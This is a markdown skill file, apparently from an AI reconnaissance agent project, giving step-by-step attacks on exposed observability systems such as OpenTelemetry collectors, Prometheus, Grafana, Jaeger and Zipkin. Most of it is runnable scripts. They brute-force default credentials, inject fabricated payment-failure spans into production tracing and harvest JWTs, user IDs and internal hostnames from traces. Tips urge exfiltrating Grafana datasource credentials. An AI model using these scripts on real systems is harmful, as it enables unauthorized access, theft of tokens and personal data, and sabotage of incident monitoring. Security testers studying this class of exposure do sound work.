<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: observability-stack-attacks
description: Attack techniques against exposed observability infrastructure including OpenTelemetry collectors, Prometheus /metrics, Grafana, Jaeger, Zipkin, and similar monitoring backends — including credential brute-force, data injection, and information extraction
---

# Observability Stack Attack Techniques

Observability infrastructure (metrics, traces, logs) is routinely deployed without authentication because it's assumed to be internal-only. When exposed to the internet, these systems offer:
- **Information disclosure:** internal service names, hostnames, deployment topology, error messages, query patterns
- **Data injection:** fake traces/metrics to corrupt alerting, mask attacks, or trigger false incidents
- **Credential access:** some observability endpoints are precursors to full auth bypass (e.g., Grafana API key generation)

---

## STEP 1 — Detect Observability Endpoints

```bash
# Discover observability-related subdomains
grep -iE '(otel|telemetry|tracing|metrics|grafana|jaeger|zipkin|kibana|elastic|logstash|tempo|loki|prometheus|influx|victoriametrics|datadog|honeycomb|newrelic|splunk)' \
  output/subdomains.txt | sort -u | tee output/observability_subdomains.txt

# Also check for hex-encoded observability subdomains
# Common hex encodings:
#   otel      = 6f74656c
#   metrics   = 6d657472696373
#   tracing   = 74726163696e67
#   logging   = 6c6f6767696e67
python3 -c "
known = {'otel': '6f74656c', 'metrics': '6d657472696373', 'tracing': '74726163696e67',
         'logging': '6c6f6767696e67', 'jaeger': '6a6165676572', 'tempo': '74656d706f'}
for name, hexval in known.items():
    print(f'{hexval} = {name}')
print('Check if any of these hex values appear as subdomains')
"
grep -iE '(6f74656c|6d657472696373|74726163696e67)' output/subdomains.txt 2>/dev/null

# Standard observability ports to scan on live hosts
echo "Checking standard observability ports..."
while IFS= read -r host; do
  hostname=$(echo "$host" | grep -oE '[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}' | head -1)
  [ -z "$hostname" ] && continue
  for port in 9090 3000 16686 9411 14268 4317 4318 8080 8888 9999; do
    result=$(curl -sk -o /dev/null -w "%{http_code}" \
      --connect-timeout 3 "http://${hostname}:${port}/" 2>/dev/null)
    [ "$result" != "000" ] && [ "$result" != "" ] && \
      echo "[$result] ${hostname}:${port}"
  done
done < output/live_hosts.txt | tee output/observability_ports.txt
```

---

## STEP 2 — OpenTelemetry (OTEL) Collector Attacks

OTEL collectors are the most commonly exposed observability component in cloud-native infrastructure.

```python
# tools/otel_attack.py
"""
OpenTelemetry HTTP Collector (OTLP/HTTP) attack toolkit.

Standard ports:
  4317 — gRPC (binary protobuf)
  4318 — HTTP (JSON or protobuf) ← this skill focuses here

Standard paths:
  /v1/traces    — trace spans
  /v1/metrics   — metrics data points
  /v1/logs      — log records

Authentication types:
  - None (most common misconfiguration)
  - HTTP Basic Auth
  - Bearer token (less common)
  - mTLS (cannot attack without client cert)
"""
import urllib.request, urllib.error, ssl, json, base64, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def probe_otel_collector(base_url):
    """
    Probe an OTEL HTTP collector for:
    1. Authentication type (none, basic, bearer)
    2. Accepted signal types (traces, metrics, logs)
    3. Rate limiting behavior
    4. Error message information leakage
    """
    results = {"url": base_url, "auth": None, "endpoints": {}}

    paths = ["/v1/traces", "/v1/metrics", "/v1/logs", "/", "/health"]
    headers_to_try = [
        ("No Auth", {}),
        ("Basic admin:admin", {"Authorization": "Basic " + base64.b64encode(b"admin:admin").decode()}),
        ("Basic otel:otel", {"Authorization": "Basic " + base64.b64encode(b"otel:otel").decode()}),
        ("Basic admin:", {"Authorization": "Basic " + base64.b64encode(b"admin:").decode()}),
        ("Bearer test", {"Authorization": "Bearer test"}),
    ]

    # First probe: determine auth requirement
    print(f"\n=== Probing OTEL collector: {base_url} ===")
    for path in paths:
        url = base_url.rstrip('/') + path
        for auth_name, auth_headers in headers_to_try:
            headers = {"User-Agent": "opentelemetry-collector-contrib/0.90.1", **auth_headers}
            # Use POST with minimal valid OTLP payload
            # Minimal OTLP JSON trace payload
            minimal_trace = json.dumps({
                "resourceSpans": [{
                    "resource": {
                        "attributes": [{"key": "service.name", "value": {"stringValue": "probe"}}]
                    },
                    "scopeSpans": [{
                        "scope": {"name": "probe", "version": "1.0"},
                        "spans": [{
                            "traceId": "a" * 32,
                            "spanId": "b" * 16,
                            "name": "probe-span",
                            "kind": 1,
                            "startTimeUnixNano": str(int(time.time() * 1e9)),
                            "endTimeUnixNano": str(int(time.time() * 1e9) + 1000000),
                            "status": {"code": 1}
                        }]
                    }]
                }]
            }).encode()

            req = urllib.request.Request(
                url, data=minimal_trace if path == "/v1/traces" else b"{}",
                headers={**headers, "Content-Type": "application/json"},
                method="POST"
            )
            try:
                with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                    body = r.read(500).decode('utf-8', 'ignore')
                    print(f"[{r.status}] {path} ({auth_name}): {body[:150]}")
                    results["endpoints"][path] = {"status": r.status, "auth": auth_name}
                    if auth_name == "No Auth":
                        results["auth"] = "NONE"
                    else:
                        results["auth"] = auth_name
                    break  # Found working auth, stop trying
            except urllib.error.HTTPError as e:
                body = e.read(500).decode('utf-8', 'ignore')
                if e.code == 401:
                    # Extract WWW-Authenticate for auth type detection
                    www_auth = e.headers.get('WWW-Authenticate', '')
                    print(f"[401] {path} ({auth_name}): WWW-Auth={www_auth} | {body[:100]}")
                    if 'basic' in www_auth.lower() and auth_name == "No Auth":
                        print("  -> HTTP Basic Auth required")
                    elif 'bearer' in www_auth.lower():
                        print("  -> Bearer token required")
                elif e.code not in (404, 400):
                    print(f"[{e.code}] {path} ({auth_name}): {body[:100]}")
            except Exception as ex:
                print(f"[ERR] {path}: {ex}")
            time.sleep(0.5)

    return results

def brute_force_otel_basic_auth(base_url, path="/v1/traces"):
    """
    Brute force HTTP Basic Auth on OTEL collector.
    Only use after confirming Basic Auth is required.
    Common OTEL collector default credentials.
    """
    credentials = [
        ("admin", "admin"), ("otel", "otel"), ("collector", "collector"),
        ("opentelemetry", "opentelemetry"), ("", ""), ("admin", ""),
        ("otel", "password"), ("admin", "password"), ("test", "test"),
        ("prometheus", "prometheus"), ("grafana", "grafana"),
        ("metrics", "metrics"), ("monitor", "monitor"),
        ("otelcol", "otelcol"), ("collector", "password"),
    ]

    url = base_url.rstrip('/') + path
    print(f"\n=== Brute forcing OTEL Basic Auth: {url} ===")

    for user, passwd in credentials:
        creds = base64.b64encode(f"{user}:{passwd}".encode()).decode()
        req = urllib.request.Request(
            url, data=b"{}",
            headers={
                "Authorization": f"Basic {creds}",
                "Content-Type": "application/json",
                "User-Agent": "opentelemetry-collector/1.0"
            },
            method="POST"
        )
        try:
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                print(f"[FOUND] {user}:{passwd} → HTTP {r.status}")
                return (user, passwd)
        except urllib.error.HTTPError as e:
            if e.code != 401:
                print(f"[{e.code}] {user}:{passwd} → {e.read(100).decode()[:80]}")
        except Exception as ex:
            pass
        time.sleep(0.3)

    print("[*] No default credentials found")
    return None

def inject_otel_traces(base_url, auth_headers={}):
    """
    Inject fake traces to corrupt distributed tracing.
    Use to demonstrate impact after credential confirmation.
    """
    url = base_url.rstrip('/') + "/v1/traces"

    # Inject a fake "payment failure" span
    payload = json.dumps({
        "resourceSpans": [{
            "resource": {
                "attributes": [
                    {"key": "service.name", "value": {"stringValue": "payment-processor"}},
                    {"key": "service.version", "value": {"stringValue": "1.0.0"}},
                    {"key": "deployment.environment", "value": {"stringValue": "production"}}
                ]
            },
            "scopeSpans": [{
                "scope": {"name": "payment-processor", "version": "1.0"},
                "spans": [{
                    "traceId": "c" * 32,
                    "spanId": "d" * 16,
                    "name": "processPayment",
                    "kind": 2,  # SERVER
                    "startTimeUnixNano": str(int(time.time() * 1e9)),
                    "endTimeUnixNano": str(int(time.time() * 1e9) + 5000000000),  # 5 second span
                    "status": {"code": 2, "message": "PAYMENT_VAULT_UNREACHABLE"},
                    "attributes": [
                        {"key": "http.status_code", "value": {"intValue": 500}},
                        {"key": "error.type", "value": {"stringValue": "PaymentVaultError"}},
                        {"key": "error.message", "value": {"stringValue": "injected-probe"}},
                    ]
                }]
            }]
        }]
    }).encode()

    req = urllib.request.Request(
        url, data=payload,
        headers={**auth_headers, "Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            print(f"[{r.status}] Trace injection successful: {r.read(200).decode()}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[{e.code}] Trace injection: {e.read(200).decode()[:100]}")
    return False

# Main execution
if __name__ == "__main__":
    # Load observability subdomains
    targets = []
    try:
        with open("output/observability_subdomains.txt") as f:
            for line in f:
                host = line.strip()
                if host:
                    targets.append(f"https://{host}")
    except FileNotFoundError:
        pass

    for target in targets:
        result = probe_otel_collector(target)
        if result.get("auth") == "NONE":
            print(f"\n[CRITICAL] Unauthenticated OTEL access at {target}")
        elif result.get("auth"):
            print(f"\n[FINDING] Auth required but found working credentials at {target}")
            # Try default credential brute force
            creds = brute_force_otel_basic_auth(target)
            if creds:
                auth_header = {"Authorization": "Basic " + base64.b64encode(f"{creds[0]}:{creds[1]}".encode()).decode()}
                inject_otel_traces(target, auth_header)
```

```bash
python3 tools/otel_attack.py | tee output/otel_attack_results.txt
```

---

## STEP 3 — Prometheus /metrics Exploitation

```bash
# Probe Prometheus metrics endpoints
for host in $(cat output/live_hosts.txt | grep -oE '[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}'); do
  for path in "/metrics" "/prometheus/metrics" "/actuator/prometheus" "/-/metrics"; do
    result=$(curl -sk -o - -w "\n%{http_code}" "https://${host}${path}" 2>/dev/null)
    status=$(echo "$result" | tail -1)
    body=$(echo "$result" | head -5)
    if [ "$status" = "200" ] && echo "$body" | grep -q "^#\|^[a-z_]"; then
      echo "[PROMETHEUS] https://${host}${path}"
      # Extract service names and internal hostnames from metrics
      curl -sk "https://${host}${path}" \
        | grep -oE '[a-zA-Z0-9._-]{5,60}\.[a-zA-Z]{2,}' \
        | sort -u | head -20
    fi
  done
done | tee output/prometheus_findings.txt
```

---

## STEP 4 — Grafana Unauthenticated Access

```python
# tools/grafana_attack.py
"""
Grafana attack vectors:
1. Default credentials: admin:admin (very common)
2. Anonymous access enabled (some orgs enable this)
3. API key in URL parameters
4. Snapshot API without auth
5. Public dashboards
"""
import urllib.request, urllib.error, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def attack_grafana(base_url):
    """Test Grafana instance for common misconfigurations"""

    # 1. Check if anonymous access is enabled
    req = urllib.request.Request(f"{base_url}/api/org",
        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            body = json.loads(r.read())
            print(f"[ANONYMOUS ACCESS] Grafana org info: {body}")
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print(f"[AUTH REQUIRED] Grafana at {base_url}")

    # 2. Try default admin:admin
    import base64
    for user, passwd in [("admin", "admin"), ("admin", "grafana"), ("grafana", "grafana")]:
        creds = base64.b64encode(f"{user}:{passwd}".encode()).decode()
        req = urllib.request.Request(
            f"{base_url}/api/datasources",
            headers={"Authorization": f"Basic {creds}", "Accept": "application/json"}
        )
        try:
            with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
                body = json.loads(r.read())
                print(f"[DEFAULT CREDS] {user}:{passwd} → Datasources: {body}")
                return
        except urllib.error.HTTPError as e:
            if e.code != 401:
                print(f"[{e.code}] {user}:{passwd}")

    # 3. Test snapshot API (often unauthenticated)
    req = urllib.request.Request(f"{base_url}/api/snapshots",
        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            print(f"[SNAPSHOTS] Unauthenticated snapshot access: {r.read(200).decode()}")
    except urllib.error.HTTPError:
        pass
```

---

## STEP 5 — Jaeger & Zipkin Exploitation

```bash
# Jaeger UI (default port 16686)
# Contains all distributed traces including internal service calls, DB queries, auth tokens

# Check for Jaeger
for host in $(cat output/observability_subdomains.txt); do
  # Jaeger REST API (unauthenticated by default)
  result=$(curl -sk -o /dev/null -w "%{http_code}" "https://${host}/api/services")
  if [ "$result" = "200" ]; then
    echo "[JAEGER API] https://${host}/api/services"
    # Extract service names (reveals internal microservice architecture)
    curl -sk "https://${host}/api/services" | python3 -c "
import sys, json
data = json.load(sys.stdin)
services = data.get('data', [])
print(f'Services: {len(services)}')
for s in services[:20]:
    print(f'  {s}')
"
    # Extract traces (may contain auth tokens, user IDs, internal payloads)
    curl -sk "https://${host}/api/traces?service=&limit=5" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    traces = data.get('data', [])
    print(f'Traces found: {len(traces)}')
    for trace in traces[:2]:
        spans = trace.get('spans', [])
        for span in spans[:3]:
            tags = {t['key']: t.get('value','') for t in span.get('tags', [])}
            print(f'  Span: {span.get(\"operationName\")} | Tags: {list(tags.keys())[:5]}')
except Exception as e:
    print(f'Error: {e}')
"
  fi
done
```

---

## Key Observability Endpoints Reference

| Tool | Default Port | Key Attack Path | Auth Default |
|------|-------------|----------------|--------------|
| OTEL HTTP Collector | 4318 | `/v1/traces`, `/v1/metrics`, `/v1/logs` | None |
| OTEL gRPC Collector | 4317 | gRPC binary | None |
| Prometheus | 9090 | `/metrics`, `/api/v1/query` | None |
| Grafana | 3000 | `/api/org`, `/api/datasources` | admin:admin |
| Jaeger | 16686 | `/api/services`, `/api/traces` | None |
| Zipkin | 9411 | `/api/v2/services`, `/api/v2/traces` | None |
| Kibana | 5601 | `/api/spaces/space`, `/_cat/indices` | None |
| Loki | 3100 | `/loki/api/v1/query_range` | None |
| Tempo | 3200 | `/api/search`, `/api/traces/{id}` | None |
| InfluxDB | 8086 | `/api/v2/query` | Token |
| VictoriaMetrics | 8428 | `/metrics`, `/api/v1/query` | None |

---

## Information Extraction from Traces

Once read access is confirmed, traces contain high-value intelligence:

```python
# tools/extract_trace_intelligence.py
"""
From Jaeger/Zipkin/Tempo traces, extract:
- Internal service names (microservice map)
- Database hostnames and query patterns
- Authentication tokens (JWT, session IDs passed as trace attributes)
- User IDs, merchant IDs, transaction IDs
- Internal IP addresses and ports
- External API calls (payment gateways, banking APIs)
"""
import urllib.request, ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def extract_jaeger_intelligence(jaeger_base):
    all_intel = {"services": [], "hosts": set(), "tokens": [], "user_ids": set()}

    # Get all services
    req = urllib.request.Request(f"{jaeger_base}/api/services")
    with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
        services = json.loads(r.read()).get("data", [])
        all_intel["services"] = services
        print(f"Services: {services}")

    # Get traces for each service, extract sensitive data
    import re
    for service in services[:5]:
        req = urllib.request.Request(
            f"{jaeger_base}/api/traces?service={service}&limit=10&lookback=1h"
        )
        try:
            with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
                traces = json.loads(r.read()).get("data", [])
                for trace in traces:
                    for span in trace.get("spans", []):
                        for tag in span.get("tags", []):
                            k, v = tag.get("key", ""), str(tag.get("value", ""))
                            # JWT tokens in traces
                            if re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$', v):
                                all_intel["tokens"].append({"key": k, "jwt": v[:50] + "..."})
                            # Internal hostnames
                            if re.match(r'^[a-z][a-z0-9-]*\.[a-z][a-z0-9.-]+\.[a-z]{2,}$', v):
                                all_intel["hosts"].add(v)
                            # User/merchant IDs
                            if k in ("user.id", "merchant.id", "customer.id", "account.id"):
                                all_intel["user_ids"].add(v)
        except Exception:
            pass

    return all_intel
```

---

## Pro Tips

1. **Hex-encoded OTEL subdomains** — When you see a hex-only subdomain like `6f74656c-http`, decode it. OTEL is `6f74656c`. This is not security, it's just obfuscation.
2. **OTEL error differential** — `"no basic auth provided"` vs `"invalid credentials"` is a critical signal: the service is live and accepting connections. This alone is a reportable finding.
3. **No rate limiting on OTEL Basic Auth** — OTEL collectors rarely implement login rate limiting. This makes them ideal brute-force targets.
4. **Prometheus scrape targets** — `/api/v1/targets` in Prometheus lists ALL services being scraped, including internal ones with their full URLs and labels.
5. **Grafana datasource credentials** — Grafana stores database/Prometheus/Elasticsearch connection strings in its datasource API. If default creds work, exfiltrate all datasource configs.
6. **Trace data in Jaeger is time-limited** — Most deployments keep 7 days of traces. Prioritize extraction immediately after discovery.
